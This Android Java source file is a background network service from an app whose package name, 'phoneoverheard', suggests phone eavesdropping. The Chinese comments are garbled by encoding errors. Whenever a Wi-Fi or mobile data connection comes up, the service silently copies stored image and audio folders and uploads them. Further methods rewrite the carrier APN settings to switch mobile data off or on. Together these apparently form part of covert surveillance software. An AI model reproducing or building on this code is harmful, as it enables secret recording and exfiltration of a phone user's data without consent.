package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class NetworkService extends Service {

    private static final String TAG = "NetworkService"; 
    private static int ConnectState;
    Uri uri = Uri.parse("content://telephony/carriers");
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
    
    @Override  
    public void onCreate() { 
    	Log.i(TAG, "onCreate called.");  
    	mylog.WrLog("i",TAG,"�����ֻ�����״̬������GPRS��WIFI�� UMTS��");
        super.onCreate(); 
        //�����ֻ�����״̬������GPRS��WIFI�� UMTS��
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new ConnectionStateListener(), PhoneStateListener.LISTEN_DATA_CONNECTION_STATE);
		//ConnectivityManager connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
    }
	
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {   
        Log.i(TAG, "onStart called.");  
    }  
	
    @Override
    public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    /**
     * ���ֻ�����״̬�����仯ִ��
     * @param ��
     * @return ��
     */
	private class ConnectionStateListener extends PhoneStateListener{
		@SuppressWarnings("unused")
		private String incomingNumber;		
		@SuppressLint("SimpleDateFormat")
		@Override
		public void onDataConnectionStateChanged(int state) { 
			switch(state){
				case TelephonyManager.DATA_DISCONNECTED: //����Ͽ� 
					Log.i(TAG, "����״̬��"+state+"����Ͽ� ");
					mylog.WrLog("i",TAG,"����״̬��"+state+"����Ͽ� ");
					break; 
				case TelephonyManager.DATA_CONNECTING:   //������������ 
					Log.i(TAG, "����״̬��"+state+"������������  ");
					mylog.WrLog("i",TAG,"����״̬��"+state+"������������  ");
					break; 
				case TelephonyManager.DATA_CONNECTED:    //���������� 
					ConnectState = getConnectedType(getBaseContext());
					if(ConnectState == ConnectivityManager.TYPE_WIFI){
						Log.i(TAG, "����״̬��"+state+"���������ӣ��������������ͣ�"+ConnectState+" wifi����");
						mylog.WrLog("i",TAG,"����״̬��"+state+"���������ӣ��������������ͣ�"+ConnectState+" wifi����");
				    	ManagerService managerservice = new ManagerService(getBaseContext());
				    	Manager manager = managerservice.find("manager");
				    	String oldPath = manager.getImgfolder();
				    	String newPath = manager.getAudiofolder();
				    	FileService fileservice = new FileService();
				    	fileservice.copyFolder(oldPath, newPath, getBaseContext());
				    	fileservice.uploadFolder(newPath,getBaseContext());
					}else if(ConnectState == ConnectivityManager.TYPE_MOBILE){
						Log.i(TAG, "����״̬��"+state+"���������ӣ��������������ͣ�"+ConnectState+" �ֻ�����");
						mylog.WrLog("i",TAG,"����״̬��"+state+"���������ӣ��������������ͣ�"+ConnectState+" �ֻ�����");
				    	ManagerService managerservice = new ManagerService(getBaseContext());
				    	Manager manager = managerservice.find("manager");
				    	String oldPath = manager.getImgfolder();
				    	String newPath = manager.getAudiofolder();
				    	FileService fileservice = new FileService();
				    	fileservice.copyFolder(oldPath, newPath, getBaseContext());
				    	fileservice.uploadFolder(newPath,getBaseContext());
					}
					break; 
			} 
		} 	
	}
    
    /**
     * �ж��Ƿ�����������
     * @param context
     * @return boolean
     */
    public boolean isNetworkConnected(Context context) { 
    	if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
	    	if (mNetworkInfo != null) { 
	    		return mNetworkInfo.isAvailable(); 
	    	} 
    	} 
    	return false; 
    }
    
    /**
     * �ж�WIFI�����Ƿ����
     * @param context
     * @return boolean
     */
    public boolean isWifiConnected(Context context) { 
    	if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mWiFiNetworkInfo = mConnectivityManager 
	    	.getNetworkInfo(ConnectivityManager.TYPE_WIFI); 
	    	if (mWiFiNetworkInfo != null) { 
	    		return mWiFiNetworkInfo.isAvailable(); 
	    	} 
    	} 
    	return false; 
    } 
    
    /**
     * �ж�MOBILE�����Ƿ����
     * @param context
     * @return boolean
     */
    public boolean isMobileConnected(Context context) { 
    	if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mMobileNetworkInfo = mConnectivityManager 
	    	.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
	    	if (mMobileNetworkInfo != null) { 
	    		return mMobileNetworkInfo.isAvailable(); 
	    	} 
    	} 
    	return false; 
    } 

    /**
     * ��ȡ��ǰ�������ӵ�������Ϣ
     * @param context
     * @return boolean
     */
    public static int getConnectedType(Context context) { 
	    if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
	    	if (mNetworkInfo != null && mNetworkInfo.isAvailable()) { 
	    		return mNetworkInfo.getType(); 
	    	} 
    	} 
    	return -1; 
    } 
    
    
    
    
    
    
    
    /**
     * ����APN
     * @param ��
     * @return ��
     */
    public static class APN {
    	  String id;
    	  String apn;
    	  String type;
    }
    
    /**
     * ��APN
     * @param ��
     * @return ��
     */
    @SuppressWarnings("rawtypes")
	public void openAPN() {
    	List apnlist = getAPNList();
		for (int i = 0; i < apnlist.size(); i++) {
			APN apn = (APN) apnlist.get(i); 
    	    ContentValues cv = new ContentValues();
    	    cv.put("apn", APNMatchTools.matchAPN(apn.apn));
    	    cv.put("type", APNMatchTools.matchAPN(apn.type));
    	    getContentResolver().update(uri, cv, "_id=?",
    	    new String[] { apn.id });
    	}
    }
    
    /**
     * �ر�APN
     * @param ��
     * @return ��
     */
    @SuppressWarnings("rawtypes")
	public void closeAPN() {
    	List apnlist = getAPNList();
    	for (int i = 0; i < apnlist.size(); i++) {
    		APN apn = (APN) apnlist.get(i); 
    		ContentValues cv = new ContentValues();
    		cv.put("apn", APNMatchTools.matchAPN(apn.apn) + "mdev");
    		cv.put("type", APNMatchTools.matchAPN(apn.type) + "mdev");
    		getContentResolver().update(uri, cv, "_id=?",
    		new String[] { apn.id });
    	}
    }
    
    /**
     * ��ȡAPN�б�
     * @param ��
     * @return ��
     */
    @SuppressWarnings({ "rawtypes", "unchecked" })
	private List getAPNList() {
    	String tag = "Main.getAPNList()";
    	// current��Ϊ�ձ�ʾ����ʹ�õ�APN
    	String projection[] = { "_id,apn,type,current" };
    	//��ѯ���ݿ�
    	Cursor cr = this.getContentResolver().query(uri, projection, null,null, null);
    	List list = new ArrayList();
    	while (cr != null && cr.moveToNext()) {
    		Log.d(tag,
    		cr.getString(cr.getColumnIndex("_id")) + "  "
    		+ cr.getString(cr.getColumnIndex("apn")) + "  "
    		+ cr.getString(cr.getColumnIndex("type")) + "  "
    		+ cr.getString(cr.getColumnIndex("current")));
    		APN a = new APN();
    		a.id = cr.getString(cr.getColumnIndex("_id"));
    		a.apn = cr.getString(cr.getColumnIndex("apn"));
    		a.type = cr.getString(cr.getColumnIndex("type"));
    		list.add(a);
		}
		if (cr != null)
		    cr.close();
		return list;
    }
    
    /**
     * �����������Ͳ�ѯ�ֵ�
     * @param ��
     * @return ��
     */
    public static class APNMatchTools {
    	public static class APNNet {
    		public static String CTWAP = "ctwap";   //�й�����WAP����
    		public static String CTNET = "ctnet";   //�й����Ż���������
    		public static String CMWAP = "cmwap";   //�й���ͨWAP����
    		public static String CMNET = "cmnet";   //�й���ͨ����������
    		public static String GWAP_3 = "3gwap";  //�й���ͨ3GWAP���� 
    		public static String GNET_3 = "3gnet";  //�й���ͨ3G����������
    		public static String UNIWAP = "uniwap"; //�й���ͨWAP����
    		public static String UNINET = "uninet"; //�й���ͨ����������    
    		
    	}
    	
    	@SuppressLint("DefaultLocale")
		public static String matchAPN(String currentName) {
    		if ("".equals(currentName) || null == currentName) {
    			return "";
    		}
    		currentName = currentName.toLowerCase();
    		if (currentName.startsWith(APNNet.CMNET)){
    			return APNNet.CMNET;
    		}else if (currentName.startsWith(APNNet.CMWAP)){
    			return APNNet.CMWAP;
    		}else if (currentName.startsWith(APNNet.CTNET)){
    			return APNNet.CTNET;
    		}else if (currentName.startsWith(APNNet.CTWAP)){
    			return APNNet.CTWAP;
    		}else if (currentName.startsWith(APNNet.GNET_3)){
    			return APNNet.GNET_3;
    		}else if (currentName.startsWith(APNNet.GWAP_3)){
    			return APNNet.GWAP_3;
    		}else if (currentName.startsWith(APNNet.UNINET)){
    			return APNNet.UNINET;
    		}else if (currentName.startsWith(APNNet.UNIWAP)){
    			return APNNet.UNIWAP;
    		}else if (currentName.startsWith("default")){
    			return "default";
    		}else{
    			return "";
    		}
    	 }
    }
    
}
